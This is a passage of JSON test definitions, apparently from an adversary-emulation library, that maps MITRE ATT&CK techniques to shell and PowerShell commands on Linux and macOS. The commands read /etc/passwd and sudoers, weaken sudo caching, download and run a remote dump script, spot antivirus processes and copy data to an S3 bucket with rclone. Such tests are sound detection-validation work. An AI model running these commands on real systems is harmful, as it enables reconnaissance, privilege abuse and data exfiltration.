        "description": "Path to the file that you want to compress",
        "type": "path",
        "default": "/etc/passwd"
      },
      "path_to_output_file": {
        "description": "Path of the file that you want your .gz file to be",
        "type": "path",
        "default": "/tmp/passwd.gz"
      }
    },
    "dependencies": [
      {
        "description": "Requires Python\n",
        "prereq_command": "which python || which python3\n",
        "get_prereq_command": "echo \"please install python to run this test\"; exit 1\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Uses GZip from Python to compress files\n",
    "indexed_technique": "T1560.002.01",
    "technique_index": 1,
    "categories": [
      "collection"
    ]
  },
  {
    "attack_technique": "T1560.002",
    "display_name": "Archive Collected Data: Archive via Library",
    "source_file": "T1560.002.yaml",
    "test_name": "Compressing data using bz2 in Python (FreeBSD/Linux)",
    "test_guid": "c75612b2-9de0-4d7c-879c-10d7b077072d",
    "description": "This test uses Python's bz2 module to compress /etc/passwd into /tmp/passwd.bz2 with compression level 9.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": false,
      "command": "which_python=`which python || which python3`\n$which_python -c \"import bz2;input_file=open('#{path_to_input_file}','rb');content=input_file.read();input_file.close();bz2content=bz2.compress(content,compresslevel=9);output_file=open('#{path_to_output_file}','w+');output_file.write(str(bz2content));output_file.close();\"\n",
      "cleanup_command": "rm #{path_to_output_file}\n"
    },
    "input_arguments": {
      "path_to_input_file": {
        "description": "Path to the file that you want to compress",
        "type": "path",
        "default": "/etc/passwd"
      },
      "path_to_output_file": {
        "description": "Path of the file that you want your .bz2 file to be",
        "type": "path",
        "default": "/tmp/passwd.bz2"
      }
    },
    "dependencies": [
      {
        "description": "Requires Python\n",
        "prereq_command": "which python || which python3\n",
        "get_prereq_command": "echo \"please install python to run this test\"; exit 1\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Uses bz2 from Python to compress files\n",
    "indexed_technique": "T1560.002.02",
    "technique_index": 2,
    "categories": [
      "collection"
    ]
  },
  {
    "attack_technique": "T1560.002",
    "display_name": "Archive Collected Data: Archive via Library",
    "source_file": "T1560.002.yaml",
    "test_name": "Compressing data using zipfile in Python (FreeBSD/Linux)",
    "test_guid": "001a042b-859f-44d9-bf81-fd1c4e2200b0",
    "description": "This test uses Python's zipfile module to compress /etc/passwd into /tmp/passwd.zip.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": false,
      "command": "which_python=`which python || which python3`\n$which_python -c \"from zipfile import ZipFile; ZipFile('#{path_to_output_file}', mode='w').write('#{path_to_input_file}')\"\n",
      "cleanup_command": "rm #{path_to_output_file}\n"
    },
    "input_arguments": {
      "path_to_input_file": {
        "description": "Path to the file that you want to compress",
        "type": "path",
        "default": "/etc/passwd"
      },
      "path_to_output_file": {
        "description": "Path of the file that you want your .zip file to be",
        "type": "path",
        "default": "/tmp/passwd.zip"
      }
    },
    "dependencies": [
      {
        "description": "Requires Python\n",
        "prereq_command": "which python || which python3\n",
        "get_prereq_command": "echo \"please install python to run this test\"; exit 1\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Uses zipfile from Python to compress files\n",
    "indexed_technique": "T1560.002.03",
    "technique_index": 3,
    "categories": [
      "collection"
    ]
  },
  {
    "attack_technique": "T1560.002",
    "display_name": "Archive Collected Data: Archive via Library",
    "source_file": "T1560.002.yaml",
    "test_name": "Compressing data using tarfile in Python (FreeBSD/Linux)",
    "test_guid": "e86f1b4b-fcc1-4a2a-ae10-b49da01458db",
    "description": "This test uses Python's tarfile module to compress /etc/passwd into /tmp/passwd.tar.gz.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": false,
      "command": "which_python=`which python || which python3`\n$which_python -c \"import tarfile; output_file = tarfile.open('#{path_to_output_file}','w'); output_file.add('#{path_to_input_file}'); output_file.close()\" \n",
      "cleanup_command": "rm #{path_to_output_file}\n"
    },
    "input_arguments": {
      "path_to_input_file": {
        "description": "Path to the file that you want to compress",
        "type": "path",
        "default": "/etc/passwd"
      },
      "path_to_output_file": {
        "description": "Path of the file that you want your .tar.gz file to be",
        "type": "path",
        "default": "/tmp/passwd.tar.gz"
      }
    },
    "dependencies": [
      {
        "description": "Requires Python\n",
        "prereq_command": "which python || which python3\n",
        "get_prereq_command": "echo \"please install python to run this test\"; exit 1\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Uses tarfile from Python to compress files\n",
    "indexed_technique": "T1560.002.04",
    "technique_index": 4,
    "categories": [
      "collection"
    ]
  },
  {
    "attack_technique": "T1548.003",
    "display_name": "Abuse Elevation Control Mechanism: Sudo and Sudo Caching",
    "source_file": "T1548.003.yaml",
    "test_name": "Sudo usage",
    "test_guid": "150c3a08-ee6e-48a6-aeaf-3659d24ceb4e",
    "description": "Tests Sudo enumeration methods (sudo -l, sudo cat /etc/sudoers, sudo vim /etc/sudoers).",
    "supported_platforms": [
      "macos",
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": true,
      "command": "sudo -l      \nsudo cat /etc/sudoers\nsudo vim /etc/sudoers\n"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Common Sudo enumeration methods.\n",
    "indexed_technique": "T1548.003.01",
    "technique_index": 1,
    "categories": [
      "defense-evasion",
      "privilege-escalation"
    ]
  },
  {
    "attack_technique": "T1548.003",
    "display_name": "Abuse Elevation Control Mechanism: Sudo and Sudo Caching",
    "source_file": "T1548.003.yaml",
    "test_name": "Unlimited sudo cache timeout",
    "test_guid": "a7b17659-dd5e-46f7-b7d1-e6792c91d0bc",
    "description": "Sets sudo caching timestamp_timeout to a value for unlimited.\n",
    "supported_platforms": [
      "macos",
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": true,
      "command": "sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers\nsudo visudo -c -f /etc/sudoers\n"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.\n",
    "indexed_technique": "T1548.003.02",
    "technique_index": 2,
    "categories": [
      "defense-evasion",
      "privilege-escalation"
    ]
  },
  {
    "attack_technique": "T1548.003",
    "display_name": "Abuse Elevation Control Mechanism: Sudo and Sudo Caching",
    "source_file": "T1548.003.yaml",
    "test_name": "Disable tty_tickets for sudo caching",
    "test_guid": "91a60b03-fb75-4d24-a42e-2eb8956e8de1",
    "description": "Sets sudo caching tty_tickets value to disabled.",
    "supported_platforms": [
      "macos",
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": true,
      "command": "sudo sh -c \"echo Defaults \"'!'\"tty_tickets >> /etc/sudoers\"\nsudo visudo -c -f /etc/sudoers\n"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Sets sudo caching tty_tickets value to disabled. This is dangerous to modify without using 'visudo', do not do this on a production system.\n",
    "indexed_technique": "T1548.003.03",
    "technique_index": 3,
    "categories": [
      "defense-evasion",
      "privilege-escalation"
    ]
  },
  {
    "attack_technique": "T1087.001",
    "display_name": "Account Discovery: Local Account",
    "source_file": "T1087.001.yaml",
    "test_name": "Enumerate all accounts (Local)",
    "test_guid": "f8aab3dd-5990-4bf8-b8ab-2226c951696f",
    "description": "Enumerate all accounts by copying /etc/passwd to another file(/tmp/T1087.001.txt).",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "cat /etc/passwd > #{output_file}\ncat #{output_file}\n",
      "cleanup_command": "rm -f #{output_file}\n",
      "name": "sh"
    },
    "input_arguments": {
      "output_file": {
        "description": "Path where captured results will be placed",
        "type": "path",
        "default": "/tmp/T1087.001.txt"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Enumerate all accounts by copying /etc/passwd to another file\n",
    "indexed_technique": "T1087.001.01",
    "technique_index": 1,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1087.001",
    "display_name": "Account Discovery: Local Account",
    "source_file": "T1087.001.yaml",
    "test_name": "View sudoers access",
    "test_guid": "fed9be70-0186-4bde-9f8a-20945f9370c2",
    "description": "Attempts to read the `sudoers` file from `/etc/sudoers` or `/usr/local/etc/sudoers` and saves the contents to `/tmp/T1087.001.txt`.",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "if [ -f /etc/sudoers ]; then sudo cat /etc/sudoers > #{output_file}; fi;\nif [ -f /usr/local/etc/sudoers ]; then sudo cat /usr/local/etc/sudoers > #{output_file}; fi;\ncat #{output_file}\n",
      "cleanup_command": "rm -f #{output_file}\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {
      "output_file": {
        "description": "Path where captured results will be placed",
        "type": "path",
        "default": "/tmp/T1087.001.txt"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "(requires root)\n",
    "indexed_technique": "T1087.001.02",
    "technique_index": 2,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1087.001",
    "display_name": "Account Discovery: Local Account",
    "source_file": "T1087.001.yaml",
    "test_name": "View accounts with UID 0",
    "test_guid": "c955a599-3653-4fe5-b631-f11c00eb0397",
    "description": "View accounts with UID 0.",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "grep 'x:0:' /etc/passwd > #{output_file}\ngrep '*:0:' /etc/passwd >> #{output_file}\ncat #{output_file} 2>/dev/null\n",
      "cleanup_command": "rm -f #{output_file} 2>/dev/null\n",
      "name": "sh"
    },
    "input_arguments": {
      "output_file": {
        "description": "Path where captured results will be placed",
        "type": "path",
        "default": "/tmp/T1087.001.txt"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "View accounts with UID 0\n",
    "indexed_technique": "T1087.001.03",
    "technique_index": 3,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1087.001",
    "display_name": "Account Discovery: Local Account",
    "source_file": "T1087.001.yaml",
    "test_name": "List opened files by user",
    "test_guid": "7e46c7a5-0142-45be-a858-1a3ecb4fd3cb",
    "description": "List opened files by the current user.",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "username=$(id -u -n) && lsof -u $username\n",
      "name": "sh"
    },
    "input_arguments": {},
    "dependencies": [
      {
        "description": "check if lsof exists\n",
        "prereq_command": "which lsof\n",
        "get_prereq_command": "(which pkg && pkg install -y lsof)||(which yum && yum -y install lsof)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y lsof)\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "List opened files by user\n",
    "indexed_technique": "T1087.001.04",
    "technique_index": 4,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1087.001",
    "display_name": "Account Discovery: Local Account",
    "source_file": "T1087.001.yaml",
    "test_name": "Show if a user account has ever logged in remotely",
    "test_guid": "0f0b6a29-08c3-44ad-a30b-47fd996b2110",
    "description": "This test uses lastlog or lastlogin to check remote login history and saves results to /tmp/T1087.001.txt",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "[ \"$(uname)\" = 'FreeBSD' ] && cmd=\"lastlogin\" || cmd=\"lastlog\" \n$cmd > #{output_file}\ncat #{output_file}\n",
      "cleanup_command": "rm -f #{output_file}\n",
      "name": "sh"
    },
    "input_arguments": {
      "output_file": {
        "description": "Path where captured results will be placed",
        "type": "path",
        "default": "/tmp/T1087.001.txt"
      }
    },
    "dependencies": [
      {
        "description": "Check if lastlog command exists on the machine\n",
        "prereq_command": "if [ -x \"$(command -v lastlog)\" ]; then exit 0; else exit 1; fi\n",
        "get_prereq_command": "sudo apt-get install login; exit 1;\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Show if a user account has ever logged in remotely\n",
    "indexed_technique": "T1087.001.05",
    "technique_index": 5,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1087.001",
    "display_name": "Account Discovery: Local Account",
    "source_file": "T1087.001.yaml",
    "test_name": "Enumerate users and groups",
    "test_guid": "e6f36545-dc1e-47f0-9f48-7f730f54a02e",
    "description": "Utilize groups and id to enumerate users and groups\n",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "groups\nid\n",
      "name": "sh"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Utilize groups and id to enumerate users and groups\n",
    "indexed_technique": "T1087.001.06",
    "technique_index": 6,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1005",
    "display_name": "Data from Local System",
    "source_file": "T1005.yaml",
    "test_name": "Find and dump sqlite databases (Linux)",
    "test_guid": "00cbb875-7ae4-4cf1-b638-e543fd825300",
    "description": "Download two databases (art.db and gta.db) and a sqlite dump script (sqlite_dump.sh) from a remote URL (https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src), then run a find command to find & dump the database content.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "bash",
      "elevation_required": false,
      "command": "cd $HOME\ncurl -O #{remote_url}/art\ncurl -O #{remote_url}/gta.db\ncurl -O #{remote_url}/sqlite_dump.sh\nchmod +x sqlite_dump.sh\nfind . ! -executable -exec bash -c 'if [[ \"$(head -c 15 {} | strings)\" == \"SQLite format 3\" ]]; then echo \"{}\"; ./sqlite_dump.sh {}; fi' \\;\n",
      "cleanup_command": "rm -f $HOME/.art\nrm -f $HOME/gta.db\nrm -f $HOME/sqlite_dump.sh \n"
    },
    "input_arguments": {
      "remote_url": {
        "description": "url of remote payload",
        "type": "url",
        "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src"
      }
    },
    "dependencies": [
      {
        "description": "Check if running on a Debian based machine.\n",
        "prereq_command": "if [ -x \"$(command -v sqlite3)\" ]; then echo \"sqlite3 is installed\"; else echo \"sqlite3 is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v strings)\" ]; then echo \"strings is installed\"; else echo \"strings is NOT installed\"; exit 1; fi\n",
        "get_prereq_command": "if grep -iq \"debian\\|ubuntu\\|kali\\|mint\" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi\nif grep -iq \"rhel\\|fedora\\|centos\" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi\n"
      }
    ],
    "dependency_executor_name": "",
    "original_description": "An adversary may know/assume that the user of a system uses sqlite databases which contain interest and sensitive data. In this test we download two databases and a sqlite dump script, then run a find command to find & dump the database content.\n",
    "indexed_technique": "T1005.01",
    "technique_index": 1,
    "categories": [
      "collection"
    ]
  },
  {
    "attack_technique": "T1497.001",
    "display_name": "Virtualization/Sandbox Evasion: System Checks",
    "source_file": "T1497.001.yaml",
    "test_name": "Detect Virtualization Environment (Linux)",
    "test_guid": "dfbd1a21-540d-4574-9731-e852bd6fe840",
    "description": "systemd-detect-virt detects execution in a virtualized environment.\nAt boot, dmesg stores a log if a hypervisor is detected.\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": true,
      "command": "if (systemd-detect-virt) then echo \"Virtualization Environment detected\"; fi;\nif (sudo dmidecode | egrep -i 'manufacturer|product|vendor' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo \"Virtualization Environment detected\"; fi;\n"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "systemd-detect-virt detects execution in a virtualized environment.\nAt boot, dmesg stores a log if a hypervisor is detected.\n",
    "indexed_technique": "T1497.001.01",
    "technique_index": 1,
    "categories": [
      "defense-evasion",
      "discovery"
    ]
  },
  {
    "attack_technique": "T1201",
    "display_name": "Password Policy Discovery",
    "source_file": "T1201.yaml",
    "test_name": "Examine password complexity policy - Ubuntu",
    "test_guid": "085fe567-ac84-47c7-ac4c-2688ce28265b",
    "description": "Lists the password complexity policy to console on Ubuntu Linux.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "cat /etc/pam.d/common-password\n",
      "name": "bash"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Lists the password complexity policy to console on Ubuntu Linux.\n",
    "indexed_technique": "T1201.01",
    "technique_index": 1,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1201",
    "display_name": "Password Policy Discovery",
    "source_file": "T1201.yaml",
    "test_name": "Examine password complexity policy - FreeBSD",
    "test_guid": "a7893624-a3d7-4aed-9676-80498f31820f",
    "description": "Lists the password complexity policy to console on FreeBSD.\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "cat /etc/pam.d/passwd\n",
      "name": "sh"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Lists the password complexity policy to console on FreeBSD.\n",
    "indexed_technique": "T1201.02",
    "technique_index": 2,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1201",
    "display_name": "Password Policy Discovery",
    "source_file": "T1201.yaml",
    "test_name": "Examine password complexity policy - CentOS/RHEL 7.x",
    "test_guid": "78a12e65-efff-4617-bc01-88f17d71315d",
    "description": "Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "cat /etc/security/pwquality.conf\n",
      "name": "bash"
    },
    "input_arguments": {},
    "dependencies": [
      {
        "description": "System must be CentOS or RHEL v7\n",
        "prereq_command": "if [ $(uname -a | grep -ioP 'el[0-9]' | grep -oP '[0-9]') -eq \"7\" ]; then exit 0; else exit 1; fi;\n",
        "get_prereq_command": "echo Please run from CentOS or RHEL v7\n"
      }
    ],
    "dependency_executor_name": "",
    "original_description": "Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.\n",
    "indexed_technique": "T1201.03",
    "technique_index": 3,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1201",
    "display_name": "Password Policy Discovery",
    "source_file": "T1201.yaml",
    "test_name": "Examine password complexity policy - CentOS/RHEL 6.x",
    "test_guid": "6ce12552-0adb-4f56-89ff-95ce268f6358",
    "description": "Lists the password complexity policy to console on CentOS/RHEL 6.x Linux.\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "cat /etc/pam.d/system-auth\ncat /etc/security/pwquality.conf\n",
      "name": "bash"
    },
    "input_arguments": {},
    "dependencies": [
      {
        "description": "System must be CentOS or RHEL v6\n",
        "prereq_command": "if [ $(rpm -q --queryformat '%{VERSION}') -eq \"6\" ]; then exit /b 0; else exit /b 1; fi;\n",
        "get_prereq_command": "echo Please run from CentOS or RHEL v6\n"
      }
    ],
    "dependency_executor_name": "",
    "original_description": "Lists the password complexity policy to console on CentOS/RHEL 6.x Linux.\n",
    "indexed_technique": "T1201.04",
    "technique_index": 4,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1201",
    "display_name": "Password Policy Discovery",
    "source_file": "T1201.yaml",
    "test_name": "Examine password expiration policy - All Linux",
    "test_guid": "7c86c55c-70fa-4a05-83c9-3aa19b145d1a",
    "description": "Lists the password expiration policy to console on CentOS/RHEL/Ubuntu.\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "cat /etc/login.defs\n",
      "name": "bash"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Lists the password expiration policy to console on CentOS/RHEL/Ubuntu.\n",
    "indexed_technique": "T1201.05",
    "technique_index": 5,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1033",
    "display_name": "System Owner/User Discovery",
    "source_file": "T1033.yaml",
    "test_name": "System Owner/User Discovery",
    "test_guid": "2a9b677d-a230-44f4-ad86-782df1ef108c",
    "description": "Identify System owner or users on an endpoint\n\nUpon successful execution, sh will stdout list of usernames.\n",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "users\nw\nwho\n",
      "name": "sh"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Identify System owner or users on an endpoint\n\nUpon successful execution, sh will stdout list of usernames.\n",
    "indexed_technique": "T1033.01",
    "technique_index": 1,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1567.002",
    "display_name": "Exfiltration Over Web Service: Exfiltration to Cloud Storage",
    "source_file": "T1567.002.yaml",
    "test_name": "Exfiltrate data with rclone to cloud Storage - AWS S3",
    "test_guid": "a4b74723-5cee-4300-91c3-5e34166909b4",
    "description": "Uses terraform to provision an AWS S3 bucket in the us-east-1 region, then uses rclone to copy files from `PathToAtomicsFolder/../ExternalPayloads/T1567.002/data/` to the new bucket.",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "Write-Host \"Deploying AWS infrastructure... \" -NoNewLine\n$awsAccessKey = \"#{aws_access_key}\"\n$awsSecretKey = \"#{aws_secret_key}\"\ncd PathToAtomicsFolder/T1567.002/src/\nif ($awsAccessKey -eq \"\" -or $awsSecretKey -eq \"\") {\n  $env:AWS_PROFILE = \"#{aws_profile}\"\n} else {\n  $env:AWS_ACCESS_KEY_ID = \"$awsAccessKey\"\n  $env:AWS_SECRET_ACCESS_KEY = \"$awsSecretKey\"\n}\n$null = PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform init\n$null = PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform apply -var \"aws_region=#{aws_region}\" -auto-approve\nWrite-Host \"Done!\"\nWrite-Host \"Generating rclone config... \" -NoNewLine\n$config = @\"\n[exfils3]\ntype = s3\nprovider = AWS\nenv_auth = true\nregion = #{aws_region}\n\"@\n$config | Out-File -FilePath \"PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone.conf\" -Encoding ascii\nWrite-Host \"Done!\"\nWrite-Host \"Exfiltrating data... \" -NoNewLine\n$bucket = \"$(PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform output bucket)\".Replace(\"`\"\",\"\")\ncd PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone-v*\n$null = ./rclone copy --max-size 1700k \"PathToAtomicsFolder/../ExternalPayloads/T1567.002/data/\" exfils3:$bucket --config \"PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone.conf\"\nWrite-Host \"Done!\"\n",
      "cleanup_command": "Write-Host \"Destroying AWS infrastructure... \" -NoNewLine\n$awsAccessKey = \"#{aws_access_key}\"\n$awsSecretKey = \"#{aws_secret_key}\"\ncd PathToAtomicsFolder/T1567.002/src/\nif ($awsAccessKey -eq \"\" -or $awsSecretKey -eq \"\") {\n  $env:AWS_PROFILE = \"#{aws_profile}\"\n} else {\n  $env:AWS_ACCESS_KEY_ID = \"$awsAccessKey\"\n  $env:AWS_SECRET_ACCESS_KEY = \"$awsSecretKey\"\n}\n$null = PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform destroy -var \"aws_region=#{aws_region}\" -auto-approve\nWrite-Host \"Done!\"\n",
      "name": "powershell",
      "elevation_required": false
    },
    "input_arguments": {
      "rclone_path": {
        "description": "Directory of rclone.exe",
        "type": "path",
        "default": "PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone-v*/"
      },
      "exfil_directory": {
        "description": "Directory to exfiltrate",
        "type": "string",
        "default": "PathToAtomicsFolder/../ExternalPayloads/T1567.002/data/"
      },
      "terraform_path": {
        "description": "Directory of terraform",
        "type": "path",
        "default": "PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*"
      },
      "aws_access_key": {
        "description": "AWS Access Key",
        "type": "string",
        "default": ""
      },
      "aws_secret_key": {
        "description": "AWS Secret Key",
        "type": "string",
        "default": ""
      },
      "aws_region": {
        "description": "AWS Region",
        "type": "string",
        "default": "us-east-1"
      },
      "aws_profile": {
        "description": "AWS Profile",
        "type": "string",
        "default": "default"
      }
    },
    "dependencies": [
      {
        "description": "rclone must exist at (#{rclone_path})\n",
        "prereq_command": "if (Test-Path \"#{rclone_path}\") {exit 0} else {exit 1}\n",
        "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder/../ExternalPayloads/\" -ErrorAction Ignore -Force | Out-Null\n$arch = ([System.Runtime.InteropServices.RuntimeInformation]::OSArchitecture).ToString().ToLower()\n$operatingSystem = ([System.Runtime.InteropServices.RuntimeInformation]::OSDescription).ToString().ToLower()\nif ($operatingSystem -match \"darwin\") {\n  Invoke-WebRequest \"https://downloads.rclone.org/rclone-current-osx-$arch.zip\" -OutFile \"PathToAtomicsFolder/../ExternalPayloads/rclone.zip\"\n} elseif ($operatingSystem -match \"linux\") {\n  Invoke-WebRequest \"https://downloads.rclone.org/rclone-current-linux-$arch.zip\" -OutFile \"PathToAtomicsFolder/../ExternalPayloads/rclone.zip\"\n}\nExpand-archive -path \"PathToAtomicsFolder/../ExternalPayloads/rclone.zip\" -DestinationPath \"PathToAtomicsFolder/../ExternalPayloads/T1567.002/\" -force\n"
      },
      {
        "description": "terraform must exist at (#{terraform_path})",
        "prereq_command": "if (Test-Path \"#{terraform_path}\") {exit 0} else {exit 1}\n",
        "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder/../ExternalPayloads/\" -ErrorAction Ignore -Force | Out-Null\n$arch = ([System.Runtime.InteropServices.RuntimeInformation]::OSArchitecture).ToString().ToLower()\n$operatingSystem = ([System.Runtime.InteropServices.RuntimeInformation]::OSDescription).ToString().ToLower()\nif ($operatingSystem -match \"darwin\") {\n  Invoke-WebRequest \"https://releases.hashicorp.com/terraform/1.10.5/terraform_1.10.5_darwin_$arch.zip\" -OutFile \"PathToAtomicsFolder/../ExternalPayloads/terraform.zip\"\n} elseif ($operatingSystem -match \"linux\") {\n  Invoke-WebRequest \"https://releases.hashicorp.com/terraform/1.10.5/terraform_1.10.5_linux_$arch.zip\" -OutFile \"PathToAtomicsFolder/../ExternalPayloads/terraform.zip\"\n}\nExpand-archive -path \"PathToAtomicsFolder/../ExternalPayloads/terraform.zip\" -DestinationPath \"PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v1.10.5/\" -force\n"
      },
      {
        "description": "Must provide a valid directory or file path to exfiltrate to AWS S3\n",
        "prereq_command": "if (Test-Path \"#{exfil_directory}\") {exit 0} else {exit 1}\n",
        "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder/../ExternalPayloads/T1567.002/data\" -ErrorAction Ignore -Force | Out-Null\nforeach($fileSuffix in 1..10) {\n  Set-Content \"PathToAtomicsFolder/../ExternalPayloads/T1567.002/data/test$fileSuffix.txt\" \"This is a test file\"\n}\n"
      }
    ],
    "dependency_executor_name": "powershell",
    "original_description": "This test uses rclone to exfiltrate data to a remote cloud storage instance. (AWS S3)\nSee https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/\n",
    "indexed_technique": "T1567.002.01",
    "technique_index": 1,
    "categories": [
      "exfiltration"
    ]
  },
  {
    "attack_technique": "T1518.001",
    "display_name": "Software Discovery: Security Software Discovery",
    "source_file": "T1518.001.yaml",
    "test_name": "Security Software Discovery - ps (Linux)",
    "test_guid": "23b91cd2-c99c-4002-9e41-317c63e024a2",
    "description": "Methods to identify Security Software on an endpoint\nwhen sucessfully executed, command shell  is going to display AV/Security software it is running.\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "ps aux | egrep 'falcond|nessusd|cbagentd|td-agent|packetbeat|filebeat|auditbeat|osqueryd'\n",
      "name": "sh"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Methods to identify Security Software on an endpoint\nwhen sucessfully executed, command shell  is going to display AV/Security software it is running.\n",
    "indexed_technique": "T1518.001.01",
    "technique_index": 1,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1069.001",
    "display_name": "Permission Groups Discovery: Local Groups",
    "source_file": "T1069.001.yaml",
    "test_name": "Permission Groups Discovery (Local)",
    "test_guid": "952931a4-af0b-4335-bbbe-73c8c5b327ae",
    "description": "Runs commands to list local permissions groups.",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "if [ -x \"$(command -v dscacheutil)\" ]; then dscacheutil -q group; else echo \"dscacheutil is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v dscl)\" ]; then dscl . -list /Groups; else echo \"dscl is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v groups)\" ]; then groups; else echo \"groups is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v id)\" ]; then id; else echo \"id is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v getent)\" ]; then getent group; else echo \"getent is missing from the machine. skipping...\"; fi;\ncat /etc/group\n",
      "name": "sh"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Permission Groups Discovery\n",
    "indexed_technique": "T1069.001.01",
    "technique_index": 1,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1124",
    "display_name": "System Time Discovery",
    "source_file": "T1124.yaml",
    "test_name": "System Time Discovery in FreeBSD/macOS",
    "test_guid": "f449c933-0891-407f-821e-7916a21a1a6f",
    "description": "Identify system time. Upon execution, the local computer system time and timezone will be displayed. \n",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "date\n",
      "name": "sh"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Identify system time. Upon execution, the local computer system time and timezone will be displayed. \n",
    "indexed_technique": "T1124.01",
    "technique_index": 1,
    "categories": [
      "discovery"
    ]
  },
  {
